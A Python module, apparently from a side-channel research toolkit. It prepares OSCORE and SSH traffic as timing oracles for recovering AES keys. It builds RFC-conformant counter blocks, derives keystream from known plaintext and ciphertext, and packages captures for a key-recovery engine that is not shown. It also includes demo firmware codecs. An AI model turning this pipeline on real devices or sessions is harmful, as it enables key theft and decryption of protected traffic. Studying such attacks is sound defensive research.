"""OSCORE and SSH as flash-timing oracles.

Both protocols encrypt with an **AES-CTR keystream** under a key that is *fixed
across a huge number of blocks* (see EXPOSURE.md / the network catalogue):

  * **OSCORE** (CoAP, RFC 8613) uses COSE **AES-CCM-16-64-128** by default. CCM is
    CBC-MAC + CTR; the CTR keystream blocks are ``S_i = E(k, A_i)`` where the
    counter block ``A_i`` is built from the *public* OSCORE nonce (Partial IV +
    Sender ID). The AEAD key is derived once from the static master secret and
    **does not rotate as the Partial IV climbs** -- one key for the life of the
    security context.
  * **SSH** (RFC 4344 ``aes*-ctr``; RFC 5647 ``aes*-gcm``) encrypts every binary
    packet with an AES-CTR keystream ``E(k, ctr)`` under a data key that is fixed
    until rekey (OpenSSH default 1-4 GiB = 6.7e7-2.7e8 blocks).

**The cryptanalytic reduction:** in both, the block-cipher *output* the last-round
attack needs is exactly the keystream block, which a known-plaintext attacker
recovers as ``keystream = P ^ C``. That is the engine's existing ``ctr`` mode --
so the recovery code is unchanged and these modules only (a) build the correct
counter blocks (for the simulator and firmware, and to document realism), and
(b) turn observed packets into a ``Capture``. See ``sources.SimulatedProtocolSource``
for the hardware-free demo and ``sources.{Oscore,Ssh}NetworkSource`` for the live
network oracle.
"""
from __future__ import annotations
import numpy as np
from . import aesref
from .capture import Capture


# --------------------------------------------------------------------------
# Counter-block construction (needed by the simulator/firmware to produce the
# right E(k, .) inputs; the host attack keys off keystream = P^C and never needs
# these, which is the point -- no chosen input required).
# --------------------------------------------------------------------------

def ccm_counter_blocks(nonce: bytes, n_blocks: int, *, L: int = 2, start: int = 1):
    """AES-CCM CTR counter blocks A_i (RFC 3610 s2.3), i = start..start+n-1.

    A_i = Flags(1) || Nonce(15-L) || i (L bytes, big-endian),  Flags = L-1.
    OSCORE's default AES-CCM-16-64-128 has L=2 -> 13-byte nonce, Flags=0x01.
    A_0 encrypts the tag; message blocks use A_1, A_2, ...  (`start=1`).
    """
    nlen = 15 - L
    if len(nonce) != nlen:
        raise ValueError(f"CCM L={L} needs a {nlen}-byte nonce, got {len(nonce)}")
    flags = L - 1
    A = np.zeros((n_blocks, 16), np.uint8)
    A[:, 0] = flags
    A[:, 1:1 + nlen] = np.frombuffer(nonce, np.uint8)[None, :]
    ctr = (np.arange(n_blocks, dtype=np.uint64) + start)
    for b in range(L):
        A[:, 15 - b] = (ctr >> (8 * b)) & 0xFF
    return A


def oscore_nonce(piv: bytes, sender_id: bytes, common_iv: bytes, *, nonce_len: int = 13):
    """OSCORE AEAD nonce (RFC 8613 s5.2): left-pad Partial IV and Sender ID into
    the nonce frame, then XOR the Common IV. All inputs are public (they travel in
    the OSCORE option / are fixed per context), so the attacker can reconstruct
    every counter block without any secret."""
    S = nonce_len - 6
    frame = bytearray(nonce_len)
    frame[0] = len(piv) & 0x07                     # leftmost byte = |PIV|
    frame[1 + (S - len(sender_id)):1 + S] = sender_id
    frame[nonce_len - len(piv):] = piv
    civ = np.frombuffer(common_iv, np.uint8)
    return bytes(np.frombuffer(bytes(frame), np.uint8) ^ civ)


def ssh_ctr_blocks(iv: bytes, n_blocks: int, *, start: int = 0):
    """SSH AES-CTR counter blocks (RFC 4344): a 128-bit big-endian counter seeded
    from the KEX-derived IV and incremented by one per cipher block."""
    if len(iv) != 16:
        raise ValueError("SSH CTR IV is one 16-byte block")
    base = int.from_bytes(iv, "big")
    B = np.zeros((n_blocks, 16), np.uint8)
    for r in range(n_blocks):
        v = (base + start + r) & ((1 << 128) - 1)
        B[r] = np.frombuffer(v.to_bytes(16, "big"), np.uint8)
    return B


# --------------------------------------------------------------------------
# Observed-packet -> Capture  (the live oracle path; no key used).
# --------------------------------------------------------------------------

def keystream_from_observed(plaintext, ciphertext):
    """keystream = P ^ C, the block-cipher output for any CTR-family AEAD
    (OSCORE AES-CCM, SSH AES-CTR/GCM). Known-plaintext only; no key."""
    p = np.asarray(plaintext, np.uint8).reshape(-1, 16)
    c = np.asarray(ciphertext, np.uint8).reshape(-1, 16)
    return p ^ c


def capture_from_observed(plaintext, ciphertext, timing, *, label=""):
    """Build the Capture the engine runs on, from OBSERVED packet bytes and a
    per-block timing. Mode is 'ctr' (keystream = P^C -> recovers k10 -> master)."""
    p = np.asarray(plaintext, np.uint8).reshape(-1, 16)
    c = np.asarray(ciphertext, np.uint8).reshape(-1, 16)
    t = np.asarray(timing, float)
    if not (len(p) == len(c) == len(t)):
        raise ValueError("plaintext, ciphertext and timing must have equal length")
    return Capture(timing=t, mode="ctr", keysize=128, plaintext=p, ciphertext=c,
                   line_shift_last=4, label=label or "protocol")


# --------------------------------------------------------------------------
# Wire-format codecs shared by the CLI, the local test server, and the F429
# firmware (demo/oscore/fw). Request: 0xC0, K, PartialIV[4] big-endian.
# Reply: ct[16] (protected message block) then cyc[4] little-endian (device
# calibration count; a real attacker uses its own PTP/2nd-MCU timestamp).
# --------------------------------------------------------------------------

OSCORE_KNOWN_PT = b"CoAP/2.05 Conten"          # 16 bytes; matches fw_f4_oscore
OSCORE_NONCE_BASE = bytes([0,1,2,3,4,5,6,7,8,9,10,0,0])   # 13-byte CCM nonce base


def oscore_request(i: int, K: int = 1) -> bytes:
    return bytes([0xC0, K & 0xFF]) + (i & 0xFFFFFFFF).to_bytes(4, "big")


def oscore_nonce_for_piv(piv: int, base: bytes = OSCORE_NONCE_BASE) -> bytes:
    """Mirror the firmware: 13-byte nonce = base[0:9] || PartialIV (4 bytes BE)."""
    return bytes(base[:9]) + (piv & 0xFFFFFFFF).to_bytes(4, "big")


def oscore_decode(resp: bytes, known_pt: bytes = OSCORE_KNOWN_PT):
    """(pt16, ct16) for the protected message block; keystream = pt ^ ct."""
    return (np.frombuffer(known_pt, np.uint8), np.frombuffer(resp[:16], np.uint8))


def oscore_cycles(resp: bytes) -> int:
    """Device calibration count from reply bytes 16..19 (little-endian)."""
    b = resp[16:20]
    return int(b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) if len(b) == 4 else 0
